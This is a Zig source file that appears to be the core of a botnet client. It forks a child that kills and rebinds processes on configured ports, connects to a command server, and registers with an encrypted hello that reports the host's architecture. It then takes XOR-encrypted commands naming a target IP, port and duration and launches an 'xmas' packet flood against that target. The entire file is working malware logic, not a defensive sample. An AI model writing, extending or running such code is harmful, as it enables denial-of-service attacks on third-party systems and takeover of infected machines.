const std = @import("std");
const linux = std.os.linux;

const helpers = @import("helpers.zig");
const enc = @import("enc.zig");

const HELLO_SIGN = "0x0172737723782";

var gpa = std.heap.GeneralPurposeAllocator(.{}){};
// TODO: replace with page allocator
const allocator = gpa.allocator();

const xmas = @import("attack/xmas.zig");

const Killer = @import("Killer.zig");
const conf = @import("conf.zig");

// pub export fn _start() callconv(.C) noreturn {
pub fn main() void {
    const pid = helpers.fork() catch |err| {
        std.debug.print("fork err: {s}\n", .{@errorName(err)});
        linux.exit(1);
    };

    if (pid == 0) {
        const killer = Killer.init(allocator);

        for (conf.KILL_PORTS) |port| {
            killer.killByPort(port) catch unreachable;
        }

        for (conf.REBIND_PORTS) |port| {
            killer.rebind(port) catch unreachable;
        }
    }

    while (true) {
        connect() catch |err| switch (err) {
            error.ConnectionResetByPeer => { // maybe blocked by server side
                std.debug.print("ConnectionResetByPeer\n", .{});
                return;
            },
            else => {
                std.debug.print("err: {s}\n", .{@errorName(err)});
            },
        };
    }

    linux.exit(0);
}

pub fn connect() !void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.STREAM, 0);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init([4]u8{ 127, 0, 0, 1 }, 8081) };

    const res = linux.connect(@intCast(fd), &sockaddr.any, @sizeOf(linux.sockaddr));

    try helpers.errno(res);

    // send hello msg
    {
        const hello_msg = comptime HELLO_SIGN ++ "|" ++ helpers.getArch();

        const encrypted = enc.enc(allocator, hello_msg, 10);

        try helpers.errno(linux.sendto(
            @intCast(fd),
            @ptrCast(encrypted),
            encrypted.len,
            0,
            &sockaddr.any,
            @sizeOf(linux.sockaddr),
        ));
        allocator.free(encrypted);

        // start main loop

        while (true) {
            var buf: [1024]u8 = undefined;

            //  TODO: write helpers for this
            const n = linux.recvfrom(@intCast(fd), &buf, buf.len, 0, null, null);
            try helpers.errno(n);
            if (n == 0) {
                return error.ZeroBytes;
            }

            const payload_xor = buf[0..n];

            const payload = enc.dec(allocator, payload_xor);
            defer allocator.free(payload);

            std.debug.print("{s}\n", .{payload});

            // parse command

            var it = std.mem.split(u8, payload, " ");

            // TODO: check if next values are not null
            const cmd = it.next().?;
            const ip = helpers.parseIp(it.next().?);
            const port = std.fmt.parseInt(u16, it.next().?, 10) catch unreachable;
            const duration = std.fmt.parseInt(u16, it.next().?, 10) catch unreachable;

            if (std.mem.eql(u8, cmd, "xmas")) {
                xmas.xmas(ip, port, duration);
            }
        }
    }
}
